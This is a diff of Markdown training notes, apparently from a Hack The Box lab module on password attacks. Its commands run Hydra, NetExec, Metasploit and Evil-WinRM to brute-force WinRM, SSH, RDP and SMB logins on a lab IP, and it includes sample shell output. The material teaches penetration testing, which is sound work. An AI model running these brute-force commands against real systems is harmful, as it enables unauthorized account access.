@@ -9,24 +9,24 @@ A handy tool that we can use for our password attacks is [NetExec](https://gith
 #### NetExec Menu Options
 
 Running the tool with the `-h` flag will show us general usage instructions and some options available to us.
-```
+```bash
 tylapcheong@htb[/htb]$ netexec -h
 ```
 
 #### NetExec Protocol-Specific Help
-```
+```bash
 tylapcheong@htb[/htb]$ netexec smb -h
 ```
 
 #### NetExec Usage
 
 The general format for using NetExec is as follows:
-```
+```bash
 tylapcheong@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
 As an example, this is what attacking a WinRM endpoint might look like:
-```
+```bash
 tylapcheong@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
 
 WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
@@ -39,16 +39,16 @@ Another handy tool that we can use to communicate with the WinRM service is [Ev
 #### Evil-WinRM
 
 #### Installing Evil-WinRM
-```
+```bash
 tylapcheong@htb[/htb]$ sudo gem install evil-winrm
 ```
 
 #### Evil-WinRM Usage
-```
+```bash
 tylapcheong@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 
-```
+```bash
 tylapcheong@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
 
 Evil-WinRM shell v3.3
@@ -63,11 +63,15 @@ If the login was successful, a terminal session is initialized using the [Power
 
 We can use a tool like `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.
 
-`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197`
+```bash
+tylapcheong@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
+```
 
 To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
 
-`tylapcheong@htb[/htb]$ ssh user@10.129.42.197`
+```bash
+tylapcheong@htb[/htb]$ ssh user@10.129.42.197
+```
 
 ## Remote Desktop Protocol (RDP)
 
@@ -76,11 +80,16 @@ Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubles
 #### Hydra - RDP
 
 We can also use `Hydra` to perform RDP bruteforcing.
-`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197`
+```bash
+tylapcheong@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
+```
 
 #### xFreeRDP
-`xfreerdp /v:<target-IP> /u:<username> /p:<password>`
-`tylapcheong@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password`
+```bash
+xfreerdp /v:<target-IP> /u:<username> /p:<password>
+
+tylapcheong@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
+```
 
 ## SMB
 
@@ -89,12 +98,14 @@ We can also use `Hydra` to perform RDP bruteforcing.
 For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.
 
 #### Hydra - SMB
-`tylapcheong@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197`
+```bash
+tylapcheong@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
+```
 
 However, we may also get the following error describing that the server has sent an invalid reply.
 
 #### Hydra - Error
-```
+```bash
 tylapcheong@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -107,7 +118,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:
 ```
 
 #### Metasploit Framework
-```
+```bash
 tylapcheong@htb[/htb]$ msfconsole -q
 
 msf6 > use auxiliary/scanner/smb/smb_login
@@ -121,9 +132,13 @@ msf6 auxiliary(scanner/smb/smb_login) > run
 Now we can use `NetExec` again to view the available shares and what privileges we have for them.
 
 #### NetExec
-`tylapcheong@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares`
+```bash
+tylapcheong@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
 
 To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
 
 #### Smbclient
-`tylapcheong@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME`
+```bash
+tylapcheong@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
